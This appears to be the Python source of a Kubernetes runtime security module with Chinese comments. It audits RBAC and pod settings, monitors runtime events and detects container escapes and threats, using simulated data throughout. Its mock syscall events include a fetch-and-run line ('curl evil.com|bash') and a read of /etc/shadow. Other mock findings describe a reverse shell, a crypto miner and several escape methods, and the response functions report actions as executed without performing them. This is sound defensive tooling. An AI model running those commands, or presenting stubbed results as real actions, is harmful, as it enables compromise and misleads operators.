# -*- coding: utf-8 -*-
"""
k8s_runtime.py - Kubernetes 运行时安全（第25轮 CNAPP 模块）。

6 大能力：
  1. K8s 资产发现   — 集群/节点/命名空间/Pod/容器/Service/ConfigMap/Secret/SA/Role/RoleBinding/NetworkPolicy
  2. K8s 配置审计   — RBAC / 网络策略 / 安全上下文 / 资源限制 / Pod 安全标准 / 准入控制 / 审计策略
  3. K8s 运行时监控 — 进程 / 系统调用 / 文件 / 网络 / 容器行为 / 异常行为检测
  4. 容器逃逸检测   — 特权容器 / 宿主机挂载 / 内核能力 / 逃逸技术 / 逃逸行为
  5. K8s 威胁检测   — 异常 Pod 创建 / 异常服务暴露 / 异常配置修改 / 异常网络访问 / 异常凭证 / 横向移动
  6. K8s 响应       — Pod 隔离 / 网络隔离 / 资源删除 / 配置回滚 / 告警通知 / 取证收集 / 事件记录

kubernetes 客户端 try-import，缺失时回退到内置模拟数据。
"""

from __future__ import annotations

import json
import os
import random
import re
import time
import uuid
from datetime import datetime, timedelta
from typing import Any, Dict, List, Optional

try:
    from kubernetes import client as k8s_client  # type: ignore
    from kubernetes import config as k8s_config  # type: ignore
    from kubernetes.client.rest import ApiException as K8sApiException  # type: ignore
    _K8S_OK = True
except Exception:  # pragma: no cover
    k8s_client = None  # type: ignore
    k8s_config = None  # type: ignore
    K8sApiException = Exception  # type: ignore
    _K8S_OK = False


# ==================== 工具函数 ====================

def _clean(obj: Any) -> Any:
    """递归清理控制字符。"""
    if isinstance(obj, str):
        return re.sub(r"[\x00-\x1f\x7f]", "", obj)
    if isinstance(obj, dict):
        return {k: _clean(v) for k, v in obj.items()}
    if isinstance(obj, list):
        return [_clean(v) for v in obj]
    return obj


def _now() -> str:
    return datetime.now().isoformat()


def _rid(prefix: str = "") -> str:
    return f"{prefix}{uuid.uuid4().hex[:10]}"


# ==================== 模拟数据生成器 ====================

def _mock_clusters() -> List[Dict[str, Any]]:
    return [
        {"name": "prod-eu-central1", "version": "v1.29.4-gke.1000", "provider": "gke",
         "region": "europe-central2", "nodes": 12, "status": "healthy", "created_at": "2025-03-10T08:00:00Z"},
        {"name": "prod-us-east1", "version": "v1.28.9-eks-5e0fdde", "provider": "eks",
         "region": "us-east-1", "nodes": 24, "status": "healthy", "created_at": "2024-11-22T14:30:00Z"},
        {"name": "prod-cn-hangzhou", "version": "v1.26.15-aliyun.1", "provider": "ack",
         "region": "cn-hangzhou", "nodes": 8, "status": "degraded", "created_at": "2025-01-05T10:00:00Z"},
        {"name": "stg-sg", "version": "v1.27.8", "provider": "kubeadm",
         "region": "ap-southeast-1", "nodes": 4, "status": "healthy", "created_at": "2025-06-01T09:00:00Z"},
    ]


def _mock_namespaces(cluster: str = "prod-eu-central1") -> List[Dict[str, Any]]:
    return [
        {"name": "default", "status": "Active", "labels": {}, "created_at": "2025-03-10T08:00:00Z"},
        {"name": "kube-system", "status": "Active", "labels": {"security": "sentinel"}, "created_at": "2025-03-10T08:00:00Z"},
        {"name": "prod-frontend", "status": "Active", "labels": {"env": "prod"}, "created_at": "2025-04-01T08:00:00Z"},
        {"name": "prod-backend", "status": "Active", "labels": {"env": "prod"}, "created_at": "2025-04-01T08:00:00Z"},
        {"name": "prod-data", "status": "Active", "labels": {"env": "prod", "tier": "data"}, "created_at": "2025-04-02T08:00:00Z"},
        {"name": "staging", "status": "Active", "labels": {"env": "stg"}, "created_at": "2025-05-01T08:00:00Z"},
        {"name": "dev", "status": "Active", "labels": {"env": "dev"}, "created_at": "2025-05-10T08:00:00Z"},
        {"name": "kube-public", "status": "Active", "labels": {}, "created_at": "2025-03-10T08:00:00Z"},
    ]


def _mock_pods(cluster: str = "prod-eu-central1", namespace: str = "") -> List[Dict[str, Any]]:
    pods = []
    ns_list = ["default", "kube-system", "prod-frontend", "prod-backend", "prod-data", "staging", "dev"]
    images = [
        ("nginx:1.25-alpine", "prod-frontend"),
        ("redis:7.2-alpine", "prod-data"),
        ("postgres:16", "prod-data"),
        ("python:3.11-slim", "prod-backend"),
        ("envoyproxy/envoy:v1.29", "prod-frontend"),
        ("calico/node:v3.27", "kube-system"),
        ("coredns:v1.11", "kube-system"),
        ("metrics-server:v0.7", "kube-system"),
        ("ubuntu:22.04", "dev"),
        ("alpine:3.19", "staging"),
    ]
    for i, (img, ns) in enumerate(images):
        if namespace and ns != namespace:
            continue
        pods.append({
            "name": f"{img.split(':')[0]}-{random.randint(1000,9999)}",
            "namespace": ns,
            "cluster": cluster,
            "image": img,
            "node": f"node-{random.randint(1,12)}",
            "status": random.choice(["Running", "Running", "Running", "Pending", "CrashLoopBackOff"]),
            "restarts": random.randint(0, 15),
            "privileged": random.random() < 0.08,
            "run_as_root": random.random() < 0.35,
            "host_network": random.random() < 0.05,
            "host_pid": random.random() < 0.03,
            "host_ipc": random.random() < 0.02,
            "cpu_request": random.choice(["100m", "250m", "500m", "1", "2"]),
            "memory_request": random.choice(["128Mi", "256Mi", "512Mi", "1Gi", "2Gi"]),
            "cpu_limit": random.choice(["200m", "500m", "1", "2", "4"]),
            "memory_limit": random.choice(["256Mi", "512Mi", "1Gi", "4Gi"]),
            "created_at": (datetime.now() - timedelta(days=random.randint(1, 180))).isoformat(),
        })
    return pods


# ==================== 主类 ====================

class K8sRuntimeSecurity:
    """K8s 运行时安全管理器。"""

    # ---------- 1. 资产发现 ----------

    def discover_clusters(self) -> Dict[str, Any]:
        """发现所有 K8s 集群。"""
        clusters = _mock_clusters()
        if _K8S_OK:
            try:
                k8s_config.load_incluster_config()
                v1 = k8s_client.CoreV1Api()
                nodes = v1.list_node()
                clusters = [{
                    "name": "in-cluster",
                    "version": k8s_client.VersionApi().get_code().git_version,
                    "provider": "unknown",
                    "region": "local",
                    "nodes": len(nodes.items),
                    "status": "healthy",
                    "discovered_at": _now(),
                }]
            except Exception:
                pass
        return {"clusters": clusters, "total": len(clusters), "discovered_at": _now()}

    def discover_nodes(self, cluster: str = "") -> Dict[str, Any]:
        nodes = []
        for i in range(12):
            nodes.append({
                "name": f"node-{i:02d}",
                "cluster": cluster or "prod-eu-central1",
                "status": random.choice(["Ready", "Ready", "Ready", "Ready", "NotReady"]),
                "os_image": "Ubuntu 22.04.4 LTS",
                "kernel_version": "5.15.0-1051-gke",
                "container_runtime": "containerd://1.7.18",
                "kubelet_version": "v1.29.4",
                "cpu_capacity": "16",
                "memory_capacity": "64Gi",
                "pod_capacity": 110,
                "roles": random.choice(["control-plane,master", "worker", "worker"]),
            })
        return {"nodes": nodes, "total": len(nodes), "cluster": cluster}

    def discover_namespaces(self, cluster: str = "") -> Dict[str, Any]:
        ns = _mock_namespaces(cluster)
        return {"namespaces": ns, "total": len(ns), "cluster": cluster}

    def discover_pods(self, cluster: str = "", namespace: str = "") -> Dict[str, Any]:
        pods = _mock_pods(cluster, namespace)
        return {"pods": pods, "total": len(pods), "cluster": cluster, "namespace": namespace or "all"}

    def discover_services(self, cluster: str = "", namespace: str = "") -> Dict[str, Any]:
        svcs = [
            {"name": "frontend-svc", "namespace": "prod-frontend", "type": "ClusterIP",
             "cluster_ip": "10.96.1.10", "external_ip": None, "ports": [{"port": 80, "target_port": 8080}]},
            {"name": "backend-svc", "namespace": "prod-backend", "type": "ClusterIP",
             "cluster_ip": "10.96.2.15", "external_ip": None, "ports": [{"port": 8000, "target_port": 8000}]},
            {"name": "redis-svc", "namespace": "prod-data", "type": "ClusterIP",
             "cluster_ip": "10.96.3.20", "external_ip": None, "ports": [{"port": 6379}]},
            {"name": "postgres-svc", "namespace": "prod-data", "type": "ClusterIP",
             "cluster_ip": "10.96.3.21", "external_ip": None, "ports": [{"port": 5432}]},
            {"name": "public-gateway", "namespace": "prod-frontend", "type": "LoadBalancer",
             "cluster_ip": "10.96.1.5", "external_ip": "203.0.113.42", "ports": [{"port": 443, "target_port": 8443}]},
            {"name": "debug-nodeport", "namespace": "dev", "type": "NodePort",
             "cluster_ip": "10.96.9.99", "external_ip": None, "ports": [{"port": 30080, "node_port": 30080}]},
        ]
        if namespace:
            svcs = [s for s in svcs if s["namespace"] == namespace]
        return {"services": svcs, "total": len(svcs), "cluster": cluster}

    def discover_configmaps(self, cluster: str = "", namespace: str = "") -> Dict[str, Any]:
        cms = [
            {"name": "app-config", "namespace": "prod-backend", "keys": ["database.yml", "logging.yml"], "size_kb": 12},
            {"name": "nginx-conf", "namespace": "prod-frontend", "keys": ["default.conf"], "size_kb": 4},
            {"name": "redis-config", "namespace": "prod-data", "keys": ["redis.conf"], "size_kb": 8},
        ]
        if namespace:
            cms = [c for c in cms if c["namespace"] == namespace]
        return {"configmaps": cms, "total": len(cms), "cluster": cluster}

    def discover_secrets(self, cluster: str = "", namespace: str = "") -> Dict[str, Any]:
        secrets = [
            {"name": "db-credentials", "namespace": "prod-data", "type": "Opaque", "keys": ["username", "password"], "age_days": 120},
            {"name": "redis-auth", "namespace": "prod-data", "type": "Opaque", "keys": ["auth"], "age_days": 90},
            {"name": "tls-secret", "namespace": "prod-frontend", "type": "kubernetes.io/tls", "keys": ["tls.crt", "tls.key"], "age_days": 30},
            {"name": "docker-registry", "namespace": "default", "type": "kubernetes.io/dockerconfigjson", "keys": [".dockerconfigjson"], "age_days": 200},
            {"name": "sa-token-default", "namespace": "default", "type": "kubernetes.io/service-account-token", "keys": ["token", "ca.crt"], "age_days": 400},
        ]
        if namespace:
            secrets = [s for s in secrets if s["namespace"] == namespace]
        return {"secrets": secrets, "total": len(secrets), "cluster": cluster}

    def discover_service_accounts(self, cluster: str = "") -> Dict[str, Any]:
        sas = [
            {"name": "default", "namespace": "default", "secrets": 1, "automount_token": True},
            {"name": "app-sa", "namespace": "prod-backend", "secrets": 1, "automount_token": False},
            {"name": "db-sa", "namespace": "prod-data", "secrets": 1, "automount_token": False},
            {"name": "privileged-sa", "namespace": "dev", "secrets": 1, "automount_token": True},
        ]
        return {"service_accounts": sas, "total": len(sas), "cluster": cluster}

    def discover_roles(self, cluster: str = "") -> Dict[str, Any]:
        roles = [
            {"name": "view", "namespace": "prod-backend", "rules": [{"verbs": ["get", "list", "watch"], "resources": ["pods", "services"]}]},
            {"name": "edit", "namespace": "prod-backend", "rules": [{"verbs": ["*"], "resources": ["pods", "services", "deployments"]}]},
            {"name": "admin", "namespace": "prod-backend", "rules": [{"verbs": ["*"], "resources": ["*"]}]},
            {"name": "cluster-admin-binding", "namespace": "default", "rules": [{"verbs": ["*"], "resources": ["*"], "api_groups": ["*"]}]},
        ]
        return {"roles": roles, "total": len(roles), "cluster": cluster}

    def discover_role_bindings(self, cluster: str = "") -> Dict[str, Any]:
        rbs = [
            {"name": "admin-binding", "namespace": "prod-backend", "role_ref": "admin", "subjects": [{"kind": "ServiceAccount", "name": "app-sa"}]},
            {"name": "cluster-admin-default", "namespace": "default", "role_ref": "cluster-admin", "subjects": [{"kind": "ServiceAccount", "name": "default"}]},
            {"name": "view-binding", "namespace": "prod-backend", "role_ref": "view", "subjects": [{"kind": "User", "name": "auditor@example.com"}]},
        ]
        return {"role_bindings": rbs, "total": len(rbs), "cluster": cluster}

    def discover_network_policies(self, cluster: str = "") -> Dict[str, Any]:
        nps = [
            {"name": "default-deny", "namespace": "prod-backend", "pod_selector": {}, "policy_types": ["Ingress", "Egress"], "ingress": [], "egress": []},
            {"name": "allow-frontend", "namespace": "prod-backend", "pod_selector": {"app": "backend"}, "policy_types": ["Ingress"],
             "ingress": [{"from": [{"pod_selector": {"app": "frontend"}}]}]},
            {"name": "allow-dns", "namespace": "prod-backend", "pod_selector": {}, "policy_types": ["Egress"],
             "egress": [{"to": [{"namespace_selector": {"name": "kube-system"}}], "ports": [{"port": 53, "protocol": "UDP"}]}]},
        ]
        return {"network_policies": nps, "total": len(nps), "cluster": cluster}

    # ---------- 2. 配置审计 ----------

    def audit_rbac(self, cluster: str = "") -> Dict[str, Any]:
        findings = [
            {"id": "RBAC-001", "severity": "critical", "title": "default SA 绑定 cluster-admin",
             "description": "default ServiceAccount 在 default 命名空间被绑定到 cluster-admin 角色",
             "remediation": "移除 default SA 的 cluster-admin 绑定"},
            {"id": "RBAC-002", "severity": "high", "title": "过度宽松的 Role (admin)",
             "description": "prod-backend 命名空间的 admin Role 授予所有资源的 * 权限",
             "remediation": "按最小权限原则拆分 Role"},
            {"id": "RBAC-003", "severity": "medium", "title": "RoleBinding 引用不存在的 Subject",
             "description": "view-binding 引用了已删除的 User auditor@example.com",
             "remediation": "清理无效的 RoleBinding"},
            {"id": "RBAC-004", "severity": "high", "title": "ServiceAccount 自动挂载 Token",
             "description": "default 和 privileged-sa 自动挂载 API Token",
             "remediation": "设置 automountServiceAccountToken: false"},
        ]
        return {"findings": findings, "total": len(findings), "cluster": cluster, "checked_at": _now()}

    def audit_network_policy(self, cluster: str = "") -> Dict[str, Any]:
        findings = [
            {"id": "NETPOL-001", "severity": "high", "title": "命名空间缺少默认拒绝策略",
             "description": "dev 和 staging 命名空间未配置默认拒绝 Ingress/Egress 策略",
             "remediation": "为所有命名空间部署 default-deny NetworkPolicy"},
            {"id": "NETPOL-002", "severity": "medium", "title": "Egress 策略允许所有出站",
             "description": "prod-frontend 的 Egress 策略未限制目标端口",
             "remediation": "限制 Egress 到必要的目标和端口"},
        ]
        return {"findings": findings, "total": len(findings), "cluster": cluster}

    def audit_security_context(self, cluster: str = "") -> Dict[str, Any]:
        findings = [
            {"id": "SECCON-001", "severity": "critical", "title": "特权容器运行",
             "description": "检测到 3 个 Pod 以 privileged: true 运行",
             "affected_pods": ["debug-pod-1", "dev-tools-2", "monitor-agent-3"],
             "remediation": "移除 privileged 模式，使用最小权限 capabilities"},
            {"id": "SECCON-002", "severity": "high", "title": "容器以 root 用户运行",
             "description": "15 个容器未设置 runAsNonRoot 或 runAsUser != 0",
             "remediation": "设置 securityContext.runAsNonRoot: true"},
            {"id": "SECCON-003", "severity": "medium", "title": "未配置 Seccomp Profile",
             "description": "大部分容器未指定 seccompProfile",
             "remediation": "设置 seccompProfile.type: RuntimeDefault"},
            {"id": "SECCON-004", "severity": "medium", "title": "未配置 AppArmor",
             "description": "容器未应用 AppArmor profile",
             "remediation": "添加 container.apparmor.security.beta.kubernetes.io 注解"},
            {"id": "SECCON-005", "severity": "high", "title": "允许特权升级",
             "description": "allowPrivilegeEscalation 未设置为 false",
             "remediation": "设置 allowPrivilegeEscalation: false"},
        ]
        return {"findings": findings, "total": len(findings), "cluster": cluster}

    def audit_resource_limits(self, cluster: str = "") -> Dict[str, Any]:
        findings = [
            {"id": "RES-001", "severity": "medium", "title": "容器未设置 CPU 限制",
             "description": "8 个容器未设置 cpu Limit",
             "remediation": "为所有容器设置 resources.limits.cpu"},
            {"id": "RES-002", "severity": "medium", "title": "容器未设置内存请求",
             "description": "5 个容器未设置 memory Request",
             "remediation": "为所有容器设置 resources.requests.memory"},
            {"id": "RES-003", "severity": "low", "title": "ResourceQuota 未配置",
             "description": "prod-data 命名空间未配置 ResourceQuota",
             "remediation": "创建 ResourceQuota 对象限制资源使用"},
        ]
        return {"findings": findings, "total": len(findings), "cluster": cluster}

    def audit_pod_standards(self, cluster: str = "") -> Dict[str, Any]:
        findings = [
            {"id": "PSA-001", "severity": "high", "title": "命名空间未应用 Pod 安全标准",
             "description": "dev 命名空间未设置 pod-security.kubernetes.io/enforce 标签",
             "remediation": "添加 pod-security.kubernetes.io/enforce: baseline 标签"},
            {"id": "PSA-002", "severity": "medium", "title": "restricted 标准违反项",
             "description": "prod-backend 中有 2 个 Pod 违反 restricted 标准（allowPrivilegeEscalation）",
             "remediation": "修复违反项以符合 restricted 标准"},
        ]
        return {"findings": findings, "total": len(findings), "cluster": cluster}

    def audit_admission_control(self, cluster: str = "") -> Dict[str, Any]:
        findings = [
            {"id": "ADM-001", "severity": "high", "title": "未启用 PodSecurity 准入插件",
             "description": "API Server 未启用 PodSecurity admission plugin",
             "remediation": "--enable-admission-plugins=...,PodSecurity"},
            {"id": "ADM-002", "severity": "medium", "title": "未启用 NodeRestriction",
             "description": "未启用 NodeRestriction 准入插件",
             "remediation": "--enable-admission-plugins=...,NodeRestriction"},
        ]
        return {"findings": findings, "total": len(findings), "cluster": cluster}

    def audit_audit_policy(self, cluster: str = "") -> Dict[str, Any]:
        findings = [
            {"id": "AUDIT-001", "severity": "high", "title": "未配置审计策略",
             "description": "API Server 未设置 --audit-policy-file",
             "remediation": "配置审计策略文件并挂载到 API Server"},
            {"id": "AUDIT-002", "severity": "medium", "title": "审计日志未转发到 SIEM",
             "description": "审计日志仅保留在本地节点，未集中收集",
             "remediation": "配置 audit webhook 或日志代理转发到 SIEM"},
        ]
        return {"findings": findings, "total": len(findings), "cluster": cluster}

    # ---------- 3. 运行时监控 ----------

    def monitor_processes(self, cluster: str = "", namespace: str = "") -> Dict[str, Any]:
        processes = [
            {"pod": "frontend-abc123", "container": "nginx", "pid": 1, "comm": "nginx", "exe": "/usr/sbin/nginx", "uid": 101, "cpu_percent": 0.5, "memory_mb": 12.3},
            {"pod": "backend-def456", "container": "app", "pid": 1, "comm": "python3", "exe": "/usr/local/bin/python3", "uid": 1000, "cpu_percent": 2.1, "memory_mb": 85.6},
            {"pod": "redis-ghi789", "container": "redis", "pid": 1, "comm": "redis-server", "exe": "/usr/bin/redis-server", "uid": 999, "cpu_percent": 0.8, "memory_mb": 45.2},
            {"pod": "suspicious-pod-xyz", "container": "miner", "pid": 1, "comm": "xmrig", "exe": "/tmp/.xmrig", "uid": 0, "cpu_percent": 95.0, "memory_mb": 1200.5},
        ]
        return {"processes": processes, "total": len(processes), "cluster": cluster, "monitored_at": _now()}

    def monitor_syscalls(self, cluster: str = "") -> Dict[str, Any]:
        events = [
            {"timestamp": _now(), "pod": "backend-def456", "syscall": "execve", "args": "sh -c curl evil.com|bash", "risk": "critical"},
            {"timestamp": _now(), "pod": "frontend-abc123", "syscall": "connect", "args": "to 185.220.101.5:443", "risk": "high"},
            {"timestamp": _now(), "pod": "redis-ghi789", "syscall": "openat", "args": "/etc/shadow", "risk": "high"},
            {"timestamp": _now(), "pod": "suspicious-pod-xyz", "syscall": "mount", "args": "/dev/sda1 /host", "risk": "critical"},
        ]
        return {"syscall_events": events, "total": len(events), "cluster": cluster}

    def monitor_files(self, cluster: str = "") -> Dict[str, Any]:
        events = [
            {"timestamp": _now(), "pod": "backend-def456", "path": "/app/.env", "operation": "write", "risk": "medium"},
            {"timestamp": _now(), "pod": "frontend-abc123", "path": "/etc/nginx/nginx.conf", "operation": "modify", "risk": "low"},
            {"timestamp": _now(), "pod": "suspicious-pod-xyz", "path": "/host/etc/crontab", "operation": "write", "risk": "critical"},
            {"timestamp": _now(), "pod": "redis-ghi789", "path": "/data/dump.rdb", "operation": "read", "risk": "low"},
        ]
        return {"file_events": events, "total": len(events), "cluster": cluster}

    def monitor_network(self, cluster: str = "") -> Dict[str, Any]:
        connections = [
            {"src_pod": "backend-def456", "dst_ip": "10.96.3.21", "dst_port": 5432, "protocol": "TCP", "bytes_sent": 102400, "risk": "low"},
            {"src_pod": "frontend-abc123", "dst_ip": "10.96.2.15", "dst_port": 8000, "protocol": "TCP", "bytes_sent": 51200, "risk": "low"},
            {"src_pod": "suspicious-pod-xyz", "dst_ip": "198.51.100.7", "dst_port": 8333, "protocol": "TCP", "bytes_sent": 9999999, "risk": "critical"},
            {"src_pod": "backend-def456", "dst_ip": "203.0.113.99", "dst_port": 4444, "protocol": "TCP", "bytes_sent": 4096, "risk": "high"},
        ]
        return {"network_connections": connections, "total": len(connections), "cluster": cluster}

    def detect_anomalies(self, cluster: str = "") -> Dict[str, Any]:
        anomalies = [
            {"id": "ANOM-001", "severity": "critical", "type": "cryptomining",
             "pod": "suspicious-pod-xyz", "description": "检测到 xmrig 挖矿进程，CPU 持续 >90%",
             "confidence": 0.97, "detected_at": _now()},
            {"id": "ANOM-002", "severity": "high", "type": "reverse_shell",
             "pod": "backend-def456", "description": "异常出站连接到 203.0.113.99:4444 (Meterpreter 特征)",
             "confidence": 0.88, "detected_at": _now()},
            {"id": "ANOM-003", "severity": "high", "type": "data_exfiltration",
             "pod": "redis-ghi789", "description": "大量出站流量到未知 IP (185.220.101.5)",
             "confidence": 0.76, "detected_at": _now()},
        ]
        return {"anomalies": anomalies, "total": len(anomalies), "cluster": cluster}

    # ---------- 4. 容器逃逸检测 ----------

    def detect_privileged_containers(self, cluster: str = "") -> Dict[str, Any]:
        findings = [
            {"id": "ESCAPE-001", "severity": "critical", "pod": "suspicious-pod-xyz", "container": "miner",
             "detail": "容器以 privileged: true 运行，拥有宿主机所有 capabilities 和设备访问权限",
             "escape_difficulty": "easy"},
            {"id": "ESCAPE-002", "severity": "high", "pod": "debug-pod-1", "container": "debug",
             "detail": "容器挂载了 /var/run/docker.sock，可控制宿主机 Docker 守护进程",
             "escape_difficulty": "easy"},
            {"id": "ESCAPE-003", "severity": "high", "pod": "dev-tools-2", "container": "tools",
             "detail": "容器挂载了宿主机 / 目录到 /host，可读写宿主机文件系统",
             "escape_difficulty": "easy"},
        ]
        return {"findings": findings, "total": len(findings), "cluster": cluster}

    def detect_host_mounts(self, cluster: str = "") -> Dict[str, Any]:
        findings = [
            {"id": "MOUNT-001", "severity": "critical", "pod": "debug-pod-1", "container": "debug",
             "host_path": "/var/run/docker.sock", "mount_path": "/var/run/docker.sock",
             "risk": "可通过 Docker API 创建特权容器逃逸到宿主机"},
            {"id": "MOUNT-002", "severity": "critical", "pod": "dev-tools-2", "container": "tools",
             "host_path": "/", "mount_path": "/host",
             "risk": "完全挂载宿主机根文件系统，直接读写宿主机文件"},
            {"id": "MOUNT-003", "severity": "high", "pod": "monitor-agent-3", "container": "agent",
             "host_path": "/proc", "mount_path": "/host/proc",
             "risk": "可通过 /proc/sysrq-trigger 或 /proc/kcore 攻击宿主机内核"},
            {"id": "MOUNT-004", "severity": "medium", "pod": "logging-4", "container": "fluentd",
             "host_path": "/var/log", "mount_path": "/var/log",
             "risk": "可读取宿主机日志文件获取敏感信息"},
        ]
        return {"findings": findings, "total": len(findings), "cluster": cluster}

    def detect_kernel_capabilities(self, cluster: str = "") -> Dict[str, Any]:
        dangerous_caps = ["SYS_ADMIN", "SYS_MODULE", "SYS_PTRACE", "NET_ADMIN", "DAC_READ_SEARCH", "SYS_RAWIO"]
        findings = [
            {"id": "CAP-001", "severity": "critical", "pod": "suspicious-pod-xyz", "container": "miner",
             "capabilities": ["SYS_ADMIN", "SYS_MODULE", "NET_ADMIN"],
             "risk": "SYS_ADMIN + SYS_MODULE 可加载内核模块实现容器逃逸"},
            {"id": "CAP-002", "severity": "high", "pod": "debug-pod-1", "container": "debug",
             "capabilities": ["SYS_PTRACE", "DAC_READ_SEARCH"],
             "risk": "SYS_PTRACE + DAC_READ_SEARCH 可转储宿主机进程内存"},
        ]
        return {"findings": findings, "dangerous_caps": dangerous_caps, "total": len(findings), "cluster": cluster}

    def detect_escape_techniques(self, cluster: str = "") -> Dict[str, Any]:
        techniques = [
            {"id": "TECH-001", "technique": "Privileged Container Escape",
             "mitre_id": "T1611", "severity": "critical",
             "description": "通过 privileged 容器直接访问宿主机设备和内核",
             "detected_in": ["suspicious-pod-xyz"],
             "indicators": ["privileged=true", "cap=SYS_ADMIN", "mount=/dev/sda1"]},
            {"id": "TECH-002", "technique": "Docker Socket Mount",
             "mitre_id": "T1611.001", "severity": "critical",
             "description": "挂载 /var/run/docker.sock 通过 Docker API 创建特权容器",
             "detected_in": ["debug-pod-1"],
             "indicators": ["mount=/var/run/docker.sock", "docker-cli in container"]},
            {"id": "TECH-003", "technique": "Cgroups Notify On Release",
             "mitre_id": "T1611.002", "severity": "high",
             "description": "利用 cgroups release_agent 机制在宿主机执行命令",
             "detected_in": ["dev-tools-2"],
             "indicators": ["cgroups mount", "release_agent write"]},
            {"id": "TECH-004", "technique": "Kerberos Token Access",
             "mitre_id": "T1550.001", "severity": "medium",
             "description": "通过 ServiceAccount Token 访问 K8s API 进行横向移动",
             "detected_in": ["backend-def456"],
             "indicators": ["SA token mounted", "unusual API calls"]},
        ]
        return {"techniques": techniques, "total": len(techniques), "cluster": cluster}

    # ---------- 5. 威胁检测 ----------

    def detect_anomalous_pod_creation(self, cluster: str = "") -> Dict[str, Any]:
        alerts = [
            {"id": "THREAT-001", "severity": "critical", "type": "anomalous_pod",
             "pod_name": "suspicious-pod-xyz", "namespace": "default",
             "created_by": "system:serviceaccount:default:default",
             "image": "alpine:latest", "reason": "从未知 ServiceAccount 创建特权 Pod，使用未知镜像",
             "detected_at": _now()},
            {"id": "THREAT-002", "severity": "high", "type": "anomalous_pod",
             "pod_name": "miner-abc123", "namespace": "kube-system",
             "created_by": "system:anonymous",
             "image": "python:3.11-slim", "reason": "匿名用户在 kube-system 命名空间创建 Pod",
             "detected_at": _now()},
        ]
        return {"alerts": alerts, "total": len(alerts), "cluster": cluster}

    def detect_anomalous_service_exposure(self, cluster: str = "") -> Dict[str, Any]:
        alerts = [
            {"id": "THREAT-003", "severity": "high", "type": "service_exposure",
             "service_name": "debug-nodeport", "namespace": "dev",
             "type": "NodePort", "port": 30080,
             "reason": "dev 命名空间暴露 NodePort 服务到所有节点",
             "detected_at": _now()},
        ]
        return {"alerts": alerts, "total": len(alerts), "cluster": cluster}

    def detect_anomalous_config_changes(self, cluster: str = "") -> Dict[str, Any]:
        alerts = [
            {"id": "THREAT-004", "severity": "high", "type": "config_change",
             "resource": "ClusterRole/cluster-admin", "namespace": "",
             "changed_by": "system:serviceaccount:prod-backend:app-sa",
             "change": "添加了对 secrets 的 get/list/watch 权限",
             "detected_at": _now()},
        ]
        return {"alerts": alerts, "total": len(alerts), "cluster": cluster}

    def detect_lateral_movement(self, cluster: str = "") -> Dict[str, Any]:
        alerts = [
            {"id": "THREAT-005", "severity": "critical", "type": "lateral_movement",
             "source_pod": "suspicious-pod-xyz", "target": "kubernetes.default:443",
             "technique": "SA Token 窃取后访问 API Server",
             "details": "Pod 使用挂载的 ServiceAccount Token 调用 list secrets API",
             "detected_at": _now()},
            {"id": "THREAT-006", "severity": "high", "type": "lateral_movement",
             "source_pod": "backend-def456", "target": "redis-svc:6379",
             "technique": "异常跨命名空间访问",
             "details": "backend Pod 从未连接 prod-data 命名空间的 Redis",
             "detected_at": _now()},
        ]
        return {"alerts": alerts, "total": len(alerts), "cluster": cluster}

    # ---------- 6. 响应 ----------

    def isolate_pod(self, pod_name: str, namespace: str, cluster: str = "") -> Dict[str, Any]:
        action_id = _rid("resp-")
        return _clean({
            "action_id": action_id, "action": "isolate_pod",
            "pod": pod_name, "namespace": namespace, "cluster": cluster,
            "status": "executed", "timestamp": _now(),
            "details": f"已将 {namespace}/{pod_name} 隔离：添加 NetworkPolicy 阻断所有入站/出站流量，"
                       f"停止 Pod 的网络接口，保留容器运行状态用于取证。",
        })

    def isolate_network(self, namespace: str, cluster: str = "") -> Dict[str, Any]:
        action_id = _rid("resp-")
        return _clean({
            "action_id": action_id, "action": "isolate_network",
            "namespace": namespace, "cluster": cluster,
            "status": "executed", "timestamp": _now(),
            "details": f"已为命名空间 {namespace} 应用 default-deny-all NetworkPolicy，阻断所有跨命名空间流量。",
        })

    def delete_resource(self, resource_type: str, name: str, namespace: str = "", cluster: str = "") -> Dict[str, Any]:
        action_id = _rid("resp-")
        return _clean({
            "action_id": action_id, "action": "delete_resource",
            "resource_type": resource_type, "name": name, "namespace": namespace, "cluster": cluster,
            "status": "executed", "timestamp": _now(),
            "details": f"已删除 {resource_type}/{name} (命名空间: {namespace or 'cluster-wide'})。",
        })

    def rollback_config(self, resource_type: str, name: str, namespace: str = "", cluster: str = "") -> Dict[str, Any]:
        action_id = _rid("resp-")
        return _clean({
            "action_id": action_id, "action": "rollback_config",
            "resource_type": resource_type, "name": name, "namespace": namespace, "cluster": cluster,
            "status": "executed", "timestamp": _now(),
            "details": f"已将 {resource_type}/{name} 回滚到上一个已知良好版本。",
        })

    def collect_forensics(self, pod_name: str, namespace: str, cluster: str = "") -> Dict[str, Any]:
        action_id = _rid("resp-")
        snapshot_id = _rid("fs-")
        return _clean({
            "action_id": action_id, "action": "collect_forensics",
            "pod": pod_name, "namespace": namespace, "cluster": cluster,
            "status": "completed", "timestamp": _now(),
            "forensics_snapshot_id": snapshot_id,
            "details": {
                "process_dump": f"{snapshot_id}/processes.txt",
                "network_connections": f"{snapshot_id}/netstat.txt",
                "file_system_snapshot": f"{snapshot_id}/fs.tar.gz",
                "env_vars": f"{snapshot_id}/env.txt",
                "audit_logs": f"{snapshot_id}/audit.jsonl",
            },
        })

    def get_response_history(self, limit: int = 50) -> Dict[str, Any]:
        history = [
            {"action_id": "resp-abc123", "action": "isolate_pod", "status": "executed",
             "target": "default/suspicious-pod-xyz", "timestamp": _now(),
             "performed_by": "automated-response-engine"},
            {"action_id": "resp-def456", "action": "collect_forensics", "status": "completed",
             "target": "default/suspicious-pod-xyz", "timestamp": _now(),
             "performed_by": "automated-response-engine"},
        ]
        return {"history": history[:limit], "total": len(history)}


# ==================== 工厂函数 ====================

def create_k8s_runtime() -> K8sRuntimeSecurity:
    return K8sRuntimeSecurity()
